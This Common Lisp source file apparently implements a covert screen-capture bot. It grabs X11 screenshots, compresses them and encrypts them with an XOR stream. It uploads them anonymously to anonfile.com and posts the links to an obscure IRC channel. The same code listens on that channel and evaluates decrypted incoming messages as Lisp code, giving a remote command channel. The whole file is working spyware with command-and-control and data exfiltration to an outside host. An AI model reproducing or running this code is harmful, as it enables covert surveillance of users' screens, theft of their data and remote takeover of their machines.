(ql:quickload "bordeaux-threads")
(ql:quickload "clx")
(ql:quickload "zpng")
(ql:quickload "png-read")
(ql:quickload "drakma")
(ql:quickload "cl-ppcre")
(ql:quickload "cl-base64")
(ql:quickload "prbs")
(ql:quickload "cl-irc")
(ql:quickload "cl-json")

;; may be not needed
(defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type color-type))
         (vector (make-array ;; displaced vector - need copy for save
                  (* height width (zpng:samples-per-pixel png))
                  :displaced-to image :element-type '(unsigned-byte 8))))
    ;; Тут применен потенциально опасный трюк, когда мы создаем
    ;; объект PNG без данных, а потом добавляем в него данные,
    ;; используя неэкспортируемый writer.
    ;; Это нужно чтобы получить третью размерность массива,
    ;; который мы хотим передать как данные и при этом
    ;; избежать создания для этого временного объекта
    (setf (zpng::%image-data png) (copy-seq vector))
    png))

(defun get-png-sequence (png)
  (flex:with-output-to-sequence (stream)
    (zpng:write-png-stream png stream)))

;; DEPRECATED, use explicit saving png-sequence by with-open-file
;; (defun save-png (pathname-str png)
;;   (zpng:write-png png pathname-str))

(defun load-png (pathname-str)
  "Возвращает массив size-X столбцов по size-Y точек,
     где столбцы идут слева-направо, а точки в них - сверху-вниз
     ----
     В zpng есть указание на возможные варианты COLOR:
     ----
           (defmethod samples-per-pixel (png)
             (ecase (color-type png)
               (:grayscale 1)
               (:truecolor 3)
               (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
               (:grayscale-alpha 2)
               (:truecolor-alpha 4)))
    "
  (let* ((png (png-read:read-png-file pathname-str))
         (image-data (png-read:image-data png))
         (color (png-read:colour-type png))
         (dims (cond ((or (equal color :truecolor-alpha)
                          (equal color :truecolor))
                      (list (array-dimension image-data 1)
                            (array-dimension image-data 0)
                            (array-dimension image-data 2)))
                     ((or (equal color :grayscale)
                          (equal color :greyscale))
                      (list (array-dimension image-data 1)
                            (array-dimension image-data 0)))
                     (t (error 'unk-png-color-type :color color))))
         (result ;; меняем размерности X и Y местами
          (make-array dims :element-type '(unsigned-byte 8))))
    ;; (dbg "~% new-arr ~A "(array-dimensions result))
    ;; ширина, высота, цвет => высота, ширина, цвет
    (macrolet ((cycle (&body body)
                 `(do ((y 0 (incf y)))
                      ((= y (array-dimension result 0)))
                    (do ((x 0 (incf x)))
                        ((= x (array-dimension result 1)))
                      ,@body))))
      (cond ((or (equal color :truecolor-alpha)
                 (equal color :truecolor))
             (cycle (do ((z 0 (incf z)))
                        ((= z (array-dimension result 2)))
                      (setf (aref result y x z)
                            (aref image-data x y z)))))
            ((or (equal color :grayscale)
                 (equal color :greyscale))
             (cycle (setf (aref result y x)
                          (aref image-data x y))))
            (t (error 'unk-png-color-type :color color)))
      result)))
(defun binarization (image &optional threshold)
  (let* ((dims (array-dimensions image))
         (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                         ((equal 2 (length dims))  dims)
                         (t (error 'binarization-error))))
         (result (make-array new-dims :element-type '(unsigned-byte 8))))
    (macrolet ((cycle (&body body)
                 `(do ((y 0 (incf y)))
                      ((= y (array-dimension image 0)))
                    (do ((x 0 (incf x)))
                        ((= x (array-dimension image 1)))
                      ,@body))))
      (cond ((equal 3 (length dims))
             (cycle (do ((z 0 (incf z)))
                        ((= z (array-dimension image 2)))
                      (let ((avg (floor (+ (aref image y x 0)
                                           (aref image y x 1)
                                           (aref image y x 2))
                                        3)))
                        (when threshold
                          (if (< threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg)))))
            ((equal 2 (length dims))
             (cycle (let ((avg (aref image y x)))
                      (when threshold
                        (if (< threshold avg)
                            (setf avg 255)
                            (setf avg 0)))
                      (setf (aref result y x) avg))))
            (t (error 'binarization-error))))
    result))

;; TEST: binarize and save screenshot
;; (let* ((to   "x-snapshot-binarize.png")
;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
;;   (destructuring-bind (height width) ;; NB: no depth!
;;       (array-dimensions image-data)
;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


;; TEST: binarize get png and save
;; (print
;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
;;    (destructuring-bind (height width) ;; NB: no depth!
;;        (array-dimensions image-data)
;;      (let ((seq (get-png width height image-data :grayscale)))
;;        (with-open-file (file-stream "tee.png"
;;                                     :direction :output
;;                                     :if-exists :supersede
;;                                     :if-does-not-exist :create
;;                                     :element-type '(unsigned-byte 8))
;;          (write-sequence seq file-stream))))))
(defun make-bit-image (image-data)
  (destructuring-bind (height width &optional colors)
      (array-dimensions image-data)
    ;; функция может работать только с бинарными изобажениями
    (assert (null colors))
    (let* ((new-width (+ (logior width 7) 1))
           (bit-array (make-array (list height new-width)
                                  :element-type 'bit
                                  :initial-element 1)))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          ;; если цвет пикселя не белый, считаем,
          ;; что это не фон и заносим в битовый массив 1
          (if (equal (aref image-data qy qx) 255)
              (setf (bit bit-array qy qx) 1)
              (setf (bit bit-array qy qx) 0))))
      bit-array)))

;; TEST: make-bit-image
;; (print
;;  (make-bit-image
;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))

(defparameter *irc-sess* (get-universal-time))
(defparameter *irc-user* (format nil "b~A" *irc-sess*))
(defparameter *irc-serv* "irc.freenode.org")
(defparameter *irc-chan* "#nvrtlessfndout")
(defparameter *irc-lock* (bt:make-lock "irc-lock"))

(defun try-irc-conn ()
  (let ((conn (handler-case
                  (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
                (USOCKET:NS-TRY-AGAIN-CONDITION () nil))))
    (if conn
        conn
        (progn
          (sleep 3)
          (try-irc-conn)))))

(defparameter *irc-conn* (try-irc-conn))
(defun irc-loop ()
  (cl-irc:read-message-loop *irc-conn*))

(defparameter *irc-thread*
  (bt:make-thread (lambda ()
                    (irc-loop))
                  :name "irc-thread"
                  :initial-bindings
                  `((*standard-output* . ,*standard-output*)
                    (*irc-user* . ,*irc-user*)
                    (*irc-serv* . ,*irc-serv*)
                    (*irc-chan* . ,*irc-chan*)
                    (*irc-conn* . ,*irc-conn*))))
;; irc_cmd_proc
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

(defmacro bprint (var)
  `(subseq (with-output-to-string (*standard-output*)
             (pprint ,var)) 1))

(defparameter *irc-cmd*
  (lambda (param)
    (block irc-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             (oct  (decrypt msg *irc-sess*))
             (str  (handler-case
                       (flex:octets-to-string oct :external-format :utf-8)
                     (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil))))
        (format t "~%::COMMAND::~A::" msg)
        (format t "~%::SOURCE::~A::" src)
        (format t "~%::str::~A::" str)
        (format t "~%::eval::~A::"
                (handler-case (bprint (eval (read-from-string  str)))
                  (TYPE-ERROR () (return-from irc-cmd-block nil))))
        (finish-output)))))

;; (encrypt
;;  (flex:string-to-octets
;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
;;   :external-format :utf-8)
;;  3783987858)

;; (encrypt
;;  (flex:string-to-octets
;;   "(snd)"
;;   :external-format :utf-8)
;;  3783987858)

(defun irc-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *irc-cmd* param)
  t)
(defun irc-join ()
  (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
  (sleep 1)
  (bt:with-lock-held (*irc-lock*)
    (cl-irc:join *irc-conn* *irc-chan*))
  (sleep 1)
  (bt:with-lock-held (*irc-lock*)
    (cl-irc:privmsg
     *irc-conn* *irc-chan*
     (format nil "nfo:start"))))

(irc-join)
(defmacro with-display (host (display screen root-window) &body body)
  `(let* ((,display (xlib:open-display ,host))
          (,screen (first (xlib:display-roots ,display)))
          (,root-window (xlib:screen-root ,screen)))
     (unwind-protect (progn ,@body)
       (xlib:close-display ,display))))

(defmacro with-default-display ((display &key (force nil)) &body body)
  `(let ((,display (xlib:open-default-display)))
     (unwind-protect
          (unwind-protect
               ,@body
            (when ,force
              (xlib:display-force-output ,display)))
       (xlib:close-display ,display))))

(defmacro with-default-display-force ((display) &body body)
  `(with-default-display (,display :force t) ,@body))

(defmacro with-default-screen ((screen) &body body)
  (let ((display (gensym)))
    `(with-default-display (,display)
       (let ((,screen (xlib:display-default-screen ,display)))
         ,@body))))

(defmacro with-default-window ((window) &body body)
  (let ((screen (gensym)))
    `(with-default-screen (,screen)
       (let ((,window (xlib:screen-root ,screen)))
         ,@body))))

(defun x-size ()
  (with-default-screen (s)
    (values
     (xlib:screen-width s)
     (xlib:screen-height s))))

(defparameter *default-x* 0)
(defparameter *default-y* 0)
(defparameter *default-width* 800)
(defparameter *default-height* 600)

(defun init-defaults ()
  (multiple-value-bind (width height)
      (x-size)
    (setf *default-width* width
          *default-height* height
          *default-x* 0
          *default-y* 0)))

(init-defaults)

(defun raw-image->png (data width height)
  (let* ((png (make-instance 'zpng:png :width width :height height
                             :color-type :truecolor-alpha
                             :image-data data))
         (data (zpng:data-array png)))
    (dotimes (y height)
      (dotimes (x width)
        ;; BGR -> RGB, ref code: https://goo.gl/slubfW
        ;; diffs between RGB and BGR: https://goo.gl/si1Ft5
        (rotatef (aref data y x 0) (aref data y x 2))
        (setf (aref data y x 3) 255)))
    png))

(defun x-snapshot (&key (x *default-x*) (y *default-y*)
                     (width  *default-width*) (height *default-height*)
                     path)
  ;; "Return RGB data array (The dimensions correspond to the height, width,
  ;; and pixel components, see comments in x-snapsearch for more details),
  ;; or write to file (PNG only), depend on if you provide the path keyword"
  (with-default-window (w)
    (let ((image
           (raw-image->png
            (xlib:get-raw-image w :x x :y y
                                :width width :height height
                                :format :z-pixmap)
            width height)
          ))
      (if path
          (let* ((ext (pathname-type path))
                 (path
                  (if ext
                      path
                      (concatenate 'string path ".png")))
                 (png? (or (null ext) (equal ext "png"))))
            (cond
              (png? (zpng:write-png image path))
              (t (error "Only PNG file is supported"))))
          (zpng:data-array image)))))

;; (x-snapshot :path "x-snapshot-true-color.png")
(defun pack-image (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash (logand (+ width 7) (lognot 7)) -3))
         (need-finisher (not (equal new-width (ash width -3))))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8)))
         (bp 8)
         (acc 0))
    (declare (type (unsigned-byte 8) acc)
             (type fixnum bp)
             (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (macrolet ((byte-finisher (acc qy qx bp)
                 `(progn
                    ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                    (setf (aref result ,qy (ash ,qx -3)) ,acc)
                    (setf ,acc 0)
                    (setf ,bp 8))))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width) (when need-finisher
                            (byte-finisher acc qy qx bp)))
          (declare (type fixnum qx))
          (let* ((avg (floor (+ (aref image qy qx 0)
                                (aref image qy qx 1)
                                (aref image qy qx 2))
                             3))
                 (pnt (ash avg -7)))
            (declare (type fixnum avg))
            (declare (type fixnum pnt))
            (decf bp)
            (setf acc (logior acc (ash pnt bp)))
            (when (= bp 0)
              (byte-finisher acc qy qx bp))))
        ;; (format t "~%")
        ))
    result))

;; (disassemble 'pack-image)

;; TEST: pack-image
;; (time
;;  (let* ((image (pack-image (x-snapshot)))
;;         (dims (array-dimensions image)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              image
;;              :grayscale)))
(defun unpack-image (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-image
;;   (pack-image
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-image image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))
(setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream status-code headers
                                         uri stream must-close reason-phrase)
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream status-code headers
                                             uri stream must-close reason-phrase)
            (drakma:http-request
             "https://api.anonfile.com/upload"
             ;; "http://localhost:9993/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; (anon-file-upload "555f.txt" "the content")


;; (alexandria:write-string-into-file
;;  (cl-base64:usb8-array-to-base64-string
;;   (alexandria:read-file-into-byte-vector #P"png.png"))
;;  #P"test.txt" :if-exists :supersede :external-format :utf-8)

;; (alexandria:write-byte-vector-into-file
;;  (cl-base64:base64-string-to-usb8-array
;;   (alexandria:read-file-into-string #P"test.txt" :external-format :utf-8))
;;  #P"test2" :if-exists :supersede)


;; (print (get-cookies-alist cookie-jar))
;; (print headers)
;; (setf drakma" . "drakma-default-external-format* :UTF-8)

;; (in-package :rigidus)

;; (ql:quickload "rigidus")

;; (restas:define-route upload ("/upload")
;;   "<form enctype=\"multipart/form-data\" method=\"post\">
;;    <input type=\"file\" name=\"file\">
;;    <input type=\"submit\" value=\"Отправить\">
;;    </form>")

;; (restas:define-route upload-post ("/upload" :method :post)
;;   (let ((file-info (hunchentoot:post-parameter "file")))
;;     ;; (hunchentoot:escape-for-html
;;     ;;  (alexandria:read-file-into-string (first file-info)))
;;     (format nil "~A"
;;             (bprint file-info))))

(defun save (frmt-filename-str dims image)
  (let* ((height     (car  dims))
         (width      (cadr dims))
         (png        (get-png-obj width height image :grayscale))
         (png-seq    (get-png-sequence png))
         (base64     (encrypt png-seq *irc-sess*))
         (decoded    (decrypt base64 *irc-sess*))
         (filename   (format nil frmt-filename-str
                             (format nil "~A" (get-universal-time))))
         (upload-ret (cl-json:decode-json-from-string
                      (anon-file-upload filename base64)))
         (link       (if (cdr (assoc :status upload-ret))
                         (subseq (cdadr (cadadr (assoc :data upload-ret))) 20)
                         nil))
         (full-filename (format nil "FILE_~A_~A"
                                *irc-sess*
                                filename)))
    (finish-output)
    (with-open-file (file-stream full-filename
                                 :direction :output
                                 :if-exists :supersede
                                 :if-does-not-exist :create
                                 :element-type '(unsigned-byte 8))
      (write-sequence decoded file-stream)
      (cl-irc:privmsg *irc-conn* *irc-chan*
                      (if link
                          link
                          upload-ret)))))

(let ((prev)
      (cnt 9999))
  (defun shot ()
    (let* ((snap (pack-image (x-snapshot)))
           (dims (array-dimensions snap)))
      (if (> cnt 4)
          (progn
            (save "~A" dims snap)
            (setf prev snap)
            (setf cnt 0))
          ;; else
          (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
            (do ((qy 0 (incf qy)))
                ((= qy (car dims)))
              (declare (type fixnum qy))
              (do ((qx 0 (incf qx)))
                  ((= qx (cadr dims)))
                (declare (type fixnum qx))
                (setf (aref xored qy qx)
                      (logxor (aref prev qy qx)
                              (aref snap qy qx)))))
            (save (format nil "~~A_~A" cnt) dims xored)
            (setf prev snap)
            (incf cnt))))
    (sleep 1)
    ;; (shot)
    ))

(shot)
